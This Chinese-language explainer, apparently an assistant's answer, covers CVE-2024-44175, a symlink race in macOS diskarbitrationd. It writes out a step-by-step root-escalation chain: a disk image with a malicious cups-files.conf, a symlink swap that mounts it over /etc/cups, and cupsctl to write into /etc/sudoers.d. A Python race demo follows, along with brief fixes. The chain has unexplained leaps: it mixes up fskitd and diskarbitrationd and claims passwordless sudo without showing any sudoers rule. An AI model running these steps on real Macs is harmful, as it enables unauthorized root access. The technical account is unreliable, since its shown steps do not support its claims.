## CVE-2024-44175：macOS 磁盘仲裁守护进程（diskarbitrationd）的符号链接验证漏洞

### 漏洞简介

CVE-2024-44175 是 macOS 中 `diskarbitrationd` 守护进程的一个“检查时间到使用时间”（TOCTOU）漏洞。简单来说，就是在检查磁盘挂载路径后，到真正使用这个路径进行挂载时，路径可能已经被篡改了。攻击者可以利用符号链接（Symbolic Link）来欺骗系统，实现沙盒逃逸和权限提升。

### 技术细节

`diskarbitrationd` 负责管理 macOS 中的磁盘设备和文件系统。当它挂载用户模式文件系统（UserFS）时，会检查挂载点是否安全。但是，在实际挂载操作中，它没有使用 `-k` 或 `nofollow` 选项来阻止符号链接的跟踪。

这就导致了一个问题：

1.  **检查：** `diskarbitrationd` 检查挂载点 `/path/to/mount`，确认没有问题。
2.  **替换：** 在真正挂载之前，攻击者用一个指向 `/etc/important` 的符号链接替换了 `/path/to/mount`。
3.  **挂载：** `diskarbitrationd` 不知情地将文件系统挂载到了 `/etc/important`，导致系统配置被篡改。

由于 `fskitd` (文件系统工具守护进程) 以 root 权限运行，攻击者可以利用这个漏洞获得 root 权限。

### 实际应用例子：修改 `sudoers` 文件

一个常见的利用方式是修改 `sudoers` 文件，允许普通用户执行任何命令而不需要密码。

1.  **创建恶意磁盘镜像：** 创建一个包含恶意 `cups-files.conf` 文件的磁盘镜像。这个文件会将错误日志（ErrorLog）指向 `/etc/sudoers.d/lpe`，并将日志文件权限设置为 777。

    ```bash
    hdiutil create -fs "MS-DOS" -size 10MB -volname disk evil.dmg
    mkdir mnt
    mount -t msdos /dev/diskX mnt # 将 evil.dmg 挂载到 mnt，diskX 需要替换成你实际的磁盘设备
    
    # 创建 cups-files.conf 文件
    cat <<EOF > mnt/cups-files.conf
    ErrorLog /etc/sudoers.d/lpe
    LogFilePerm 777
    EOF
    
    umount mnt
    ```

2.  **利用漏洞挂载：** 利用 CVE-2024-44175 漏洞，将恶意磁盘镜像挂载到 `/etc/cups` 目录。

    ```bash
    rm -rf mnt
    ln -s /etc/cups mnt
    hdiutil attach -mountpoint mnt evil.dmg
    ```

3.  **触发日志写入：** 使用 `cupsctl` 命令触发 CUPS 写入错误日志，将恶意内容写入 `/etc/sudoers.d/lpe`。

    ```bash
    cupsctl # 随便执行一下，触发错误日志
    ```

4.  **获取 Root 权限：** 现在，任何属于 `staff` 组的用户都可以使用 `sudo` 命令而无需密码。

    ```bash
    sudo whoami # 不需要密码，直接显示 root
    ```

### 防御方法

这个漏洞可以通过以下方法修复：

*   **添加 `nofollow` 选项：** 在 `mount` 命令中始终使用 `nofollow` 选项，防止符号链接被跟踪。
*   **验证用户 ID：** 确保 `fskitd` 基于调用者的用户 ID 进行权限验证，而不是仅仅以 root 权限运行。

macOS Sequoia 15.1 beta 2 和 14.7 版本已经包含了这些修复。

### Demo 代码

由于漏洞利用涉及到文件系统操作和权限提升，这里提供一个简化的 Demo 代码，用于演示如何使用符号链接进行 TOCTOU 攻击。**请注意，这段代码不完整，不能直接用于漏洞利用，仅用于演示概念。**

```python
import os
import time

# 目标文件
target_file = "/tmp/important_file"

# 符号链接
symlink_path = "/tmp/my_link"

# 创建目标文件
with open(target_file, "w") as f:
    f.write("This is the original content.")

# 检查目标文件是否存在
if os.path.exists(target_file):
    print(f"{target_file} 存在.")
else:
    print(f"{target_file} 不存在.")
    exit()

# 创建符号链接
os.symlink(target_file, symlink_path)

# 模拟 TOCTOU 攻击
def simulate_toctou():
    try:
        # 在检查之后，但在使用之前，替换符号链接
        os.remove(symlink_path)
        os.symlink("/etc/passwd", symlink_path)
        print("符号链接已被替换.")
    except Exception as e:
        print(f"替换符号链接时发生错误: {e}")

# 读取符号链接的内容
def read_symlink():
    try:
        with open(symlink_path, "r") as f:
            content = f.read()
            print(f"符号链接的内容是:\n{content}")
    except Exception as e:
        print(f"读取符号链接时发生错误: {e}")

# 模拟时间延迟
time.sleep(1)

# 模拟攻击者替换符号链接
simulate_toctou()

# 读取符号链接的内容，看是否被替换
read_symlink()
```

**说明：**

*   这段代码模拟了 TOCTOU 漏洞的核心思想：在程序检查文件状态后，但在实际使用文件之前，攻击者通过替换符号链接来改变程序的行为。
*   请务必在安全的、隔离的环境中运行此代码。

希望这个更详细、更接地气的解释能够帮助您更好地理解 CVE-2024-44175 漏洞。
